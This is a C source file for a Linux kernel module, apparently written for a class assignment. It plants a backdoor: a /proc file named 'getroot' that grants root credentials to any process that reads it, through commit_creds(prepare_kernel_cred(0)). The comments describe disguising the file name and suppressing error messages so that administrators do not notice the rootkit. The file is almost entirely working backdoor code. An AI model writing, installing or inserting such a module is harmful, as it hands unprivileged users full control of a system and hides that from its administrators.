#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");

//we need to define the cred struct so that we can give the user root access
//just like how the exploit code worked
struct cred;
struct task_struct;

static struct proc_dir_entry *Root_Proc_File;


//Here is the definition of what the file will be called
//it could be anything, getroot just made sense
//in an actual application, it would be somethign less conspicuous
char* procfs_name = "getroot";

//this section I sought help from the internet, such places as
//http://stackoverflow.com/questions/12575561/invoke-root-shell-from-kernel
//

void get_root(void)
{
    //this functions by giving whatever program that calls it root access
    commit_creds(prepare_kernel_cred(0));
}


int procfile_read(char *buffer, char**buffer_location,
        off_t offset, int buffer_length, int *eof, void *data)
{
    int ret;
    
    get_root();
    ret = sprintf(buffer, "Whoops\n");
    return 0;
}

int init_module(void)
{
    //This sections of code was pulled from the assignment #5
    //it was modified slightly to match what we need here
    //The original code I used when creating the assignment 5 code was found at 
    //http://linux.die.net/lkmpg/x769.html
    //
    //first, we need to create an entry in the procfs that we will read from to activate this exploit
    Root_Proc_File = create_proc_entry(procfs_name, 0644, NULL);
    
    //We also need to check whether or not we succeeded here
    if(Root_Proc_File == NULL)
    {
        remove_proc_entry(procfs_name, NULL);
        //in an actual rootkit, we would avoid having this next line to not alert the sysadmin of our presence
        //but it is very useful for debugging purposes here
        //printk(KERN_ALERT "ERROR: Could not initialize /proc/%s\n", procfs_name);
        return -ENOMEM;
    }

    Root_Proc_File->read_proc   = procfile_read;
    //Root_Proc_File->write_proc  = procfile_write;
    //commented out for compatibility with our kernel
    //Root_Proc_File->owner       = THIS_MODULE;
    Root_Proc_File->mode        = S_IFREG | S_IRUGO;
    //This will set the code to run as root
    Root_Proc_File->uid         = 0;
    //Root_Proc_File-gid          = 0;
    //the size was an arbitrary number
    Root_Proc_File->size        = 0;

    //printk(KERN_INFO "/proc/%s created \n", procfs_name);
    return 0;
}

void cleanup_module(void)
{
    remove_proc_entry(procfs_name, NULL);
}
